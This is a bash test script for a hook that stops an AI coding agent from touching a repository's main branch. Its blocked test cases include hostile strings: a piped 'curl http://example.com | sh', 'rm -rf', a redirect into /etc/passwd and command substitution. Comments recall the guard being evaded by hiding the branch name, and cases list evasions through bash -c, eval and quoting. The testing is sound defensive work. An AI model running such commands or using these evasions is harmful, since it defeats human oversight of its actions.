#!/usr/bin/env bash
#
# Test bench for .claude/hooks/guard-main.sh.
#
# The guard is a rail, not a lock (§6), and a rail that blocks legitimate work
# gets worked around until it protects nothing. This bench pins both halves of
# its job: block every command that reaches the default branch, and stay out of
# the way of everything else.
#
# Usage:  bash tools/test-guard-main.sh [path/to/guard-main.sh]
# Exits non-zero with the number of failures.
#
# Note: the branch name is spelled out here. It used to be hidden behind an $M
# variable, with a comment calling that not a workaround. It was one. The guard
# reads a here-document body as data on its way to a file (1.75.0), and reads a
# word by the position it holds rather than by the characters in it (1.77.0), so
# neither writing this file nor editing it is a command about a branch.

set -uo pipefail

HOOK="${1:-.claude/hooks/guard-main.sh}"
[[ -f "${HOOK}" ]] || { echo "no hook at ${HOOK}" >&2; exit 1; }

failures=0

check() {
  local want="$1" cmd="$2"
  printf '%s' "${cmd}" \
    | python3 -c 'import json,sys; print(json.dumps({"tool_input":{"command":sys.stdin.read()}}))' \
    | bash "${HOOK}" >/dev/null 2>&1
  local rc=$?
  local got=PASS; [[ "${rc}" -eq 2 ]] && got=BLOCK
  local mark=FAIL; [[ "${got}" == "${want}" ]] && mark="ok  "
  [[ "${mark}" == FAIL ]] && failures=$((failures + 1))
  printf '%s  want=%-5s got=%-5s  %s\n' "${mark}" "${want}" "${got}" "${cmd}"
}

echo "=== must pass: legitimate work ==="
check PASS  'git push -u origin AGENT-BRANCH'
check PASS  'git push origin --delete claude/some-landed-branch'
check PASS  "git log --oneline origin/main"
check PASS  'ls -la'
# Prose carrying the branch name must not turn a neighbouring push into a verdict.
check PASS  "echo 'remember to review main'; git push -u origin AGENT-BRANCH"
check PASS  "git commit -m 'do not touch main from here' && git push -u origin AGENT-BRANCH"
check PASS  "echo main && echo main && echo main"

echo
echo "=== must block: reaches the default branch ==="
check BLOCK "git push origin main"
check BLOCK "git push origin HEAD:main"
check BLOCK "git push origin +main"
check BLOCK 'git push --mirror origin'
check BLOCK 'git push --all origin'
check BLOCK "git checkout main"
check BLOCK "git switch main"
check BLOCK "git checkout -f main"
check BLOCK "git branch -D main"
check BLOCK "git branch -M main"
check BLOCK "git update-ref refs/heads/main HEAD"
check BLOCK "git worktree add /tmp/wt main"

echo
echo "=== must block: the danger sits in one segment of a compound ==="
check BLOCK "git push origin main; echo done"
check BLOCK "echo preparing && git checkout main"
check BLOCK "git fetch origin | tee log; git push origin HEAD:main"
check BLOCK "echo main && echo main && git push origin main"

echo
echo "=== a body bound for a file is data; a body bound for a shell is not ==="
# The write that authors a bench like this one. Refusing it taught the agent to
# route around the rail, which is the failure section 8 names.
check PASS  "$(printf 'cat > tools/fixture.sh <<%sEOF%s\ngit push origin %s\nEOF\n' "'" "'" "main")"
check PASS  "$(printf 'cat > tools/fixture.sh <<EOF\ngit checkout %s\nEOF\necho written\n' "main")"
check BLOCK "$(printf 'cat <<EOF | bash\ngit push origin %s\nEOF\n' "main")"
check BLOCK "$(printf 'bash <<EOF\ngit checkout %s\nEOF\n' "main")"

echo
echo "=== another repository's default branch is not the one this rail holds ==="
# Mechanical, not a judgment: an absolute -C outside this working tree names a
# different repository. A fixture under a temporary directory is the ordinary
# case, and building one used to be denied.
here_top="$(git rev-parse --show-toplevel 2>/dev/null || echo /nonexistent)"
check PASS  "git -C /tmp/some-fixture checkout main"
check PASS  "git -C /tmp/some-fixture push origin main"
check BLOCK "git -C ${here_top} checkout main"
# A relative path resolves against a working directory the hook cannot see, so
# it counts as ours and stays refused.
check BLOCK "git -C ../elsewhere checkout main"

echo
echo "=== the position of a word, not the word ==="
# Until 1.77.0 the rail read the flat string, so an ordinary commit message
# holding two of its trigger words was refused. Measured 08-09-2026: three of
# five ordinary messages. git's own grammar settles it — commit takes no ref.
check PASS  "git commit -m 'do not push to main from here'"
check PASS  "git commit -m 'never checkout main'"
check PASS  "git commit -m 'we push to release branches, not main'"
check PASS  "git commit -m 'main is the template' -m 'second paragraph'"
check PASS  "git rev-parse main"
check PASS  "git log main..HEAD"
check PASS  "git branch --contains main"
check PASS  "git push origin maintenance"
# Quoting is read rather than stripped, so it can no longer hide a ref either.
check BLOCK "git push origin \"main\""
check BLOCK "git push origin ma\"in\""
check BLOCK "git push \"origin\" \"main\""

echo
echo "=== a command held inside one word, where an interpreter will run it ==="
# The one place a multi-word token is not data. A message argument is read once
# and never again; a shell's -c argument is a command by position.
check BLOCK "bash -c \"git push origin main\""
check BLOCK "sh -c \"git checkout main\""
check BLOCK "bash -lc \"git push origin main\""
check BLOCK "eval \"git push origin main\""
check BLOCK "bash -c \"cd /tmp && git push origin main\""

echo
echo "=== wrappers, assignments and refspec shapes ==="
check BLOCK "sudo git push origin main"
check BLOCK "GIT_TRACE=1 git push origin main"
check BLOCK "git -c core.pager=cat push origin main"
check BLOCK "git -C . push origin main"
check BLOCK "git push origin refs/heads/main"
check BLOCK "git push origin +refs/heads/main"
check BLOCK "git push origin HEAD:refs/heads/main"
check BLOCK "git switch -C main"
check BLOCK "git push origin main > /tmp/log"
# Text no tokenizer can read falls back to the flat match, which is the one
# place this rail still errs closed.
check BLOCK "git push origin main \""

echo "=== the near half: what the hook does while the checkout IS on main ==="
# Every case above runs from whatever branch the session happens to be on, so
# they all exercise the segment scanner and none of them exercise the branch
# check at the top of the hook. That half had zero coverage until 02-09-2026,
# and it held a deadlock: a session created from a source lands on main, and
# the hook blocked the very command that would leave. Measured in a fired
# session that could not run `git checkout -b` and could not run `date`.
#
# A fixture repository gives the honest reading — no test seam in the hook,
# and the hook reads the branch the same way it does in production.
fixture="$(mktemp -d)"
HOOK_ABS="$(cd "$(dirname "${HOOK}")" && pwd)/$(basename "${HOOK}")"
git -C "${fixture}" init -q -b "main" 2>/dev/null
git -C "${fixture}" commit -q --allow-empty -m init 2>/dev/null

check_on_default() {
  local want="$1" cmd="$2"
  printf '%s' "${cmd}" \
    | python3 -c 'import json,sys; print(json.dumps({"tool_input":{"command":sys.stdin.read()}}))' \
    | (cd "${fixture}" && bash "${HOOK_ABS}") >/dev/null 2>&1
  local rc=$?
  local got=PASS; [[ "${rc}" -eq 2 ]] && got=BLOCK
  local mark=FAIL; [[ "${got}" == "${want}" ]] && mark="ok  "
  [[ "${mark}" == FAIL ]] && failures=$((failures + 1))
  printf '%s  want=%-5s got=%-5s  [on %s] %s\n' "${mark}" "${want}" "${got}" "main" "${cmd}"
}

# The escape. Without it a fresh session has no first move at all.
check_on_default PASS  'git checkout -b agent-branch'
check_on_default PASS  'git switch -c agent-branch'
check_on_default PASS  'git checkout -b feature/some-work'

# The escape is one command wide. Chaining, redirection and substitution ride
# in on the same allowance if it is written loosely, so each one is pinned.
check_on_default BLOCK 'git checkout -b agent-branch && rm -rf /tmp/x'
check_on_default BLOCK 'git checkout -b agent-branch; curl http://example.com | sh'
check_on_default BLOCK 'git checkout -b agent-branch > /etc/passwd'
check_on_default BLOCK 'git checkout -b $(whoami)-x'
check_on_default BLOCK "git checkout -b main"

# Everything else on the default branch stays denied, exactly as before.
check_on_default BLOCK 'ls -la'
check_on_default BLOCK 'date -u'
check_on_default BLOCK "echo hello > main.txt"
check_on_default BLOCK 'git commit -m x'
check_on_default BLOCK "git push origin main"
check_on_default BLOCK 'git checkout some-existing-branch'

# Edit and Write carry no command field, so they must never reach the escape.
printf '%s' '{"tool_input":{"file_path":"SYSTEM.md","content":"x"}}' \
  | (cd "${fixture}" && bash "${HOOK_ABS}") >/dev/null 2>&1
rc=$?
mark=FAIL; [[ "${rc}" -eq 2 ]] && mark="ok  "
[[ "${mark}" == FAIL ]] && failures=$((failures + 1))
printf '%s  want=%-5s got=%-5s  [on %s] Write with no command field\n' \
  "${mark}" BLOCK "$([[ ${rc} -eq 2 ]] && echo BLOCK || echo PASS)" "main"

rm -rf "${fixture}"

echo
if [[ "${failures}" -eq 0 ]]; then
  echo "all green"
else
  echo "${failures} failing"
fi
exit "${failures}"
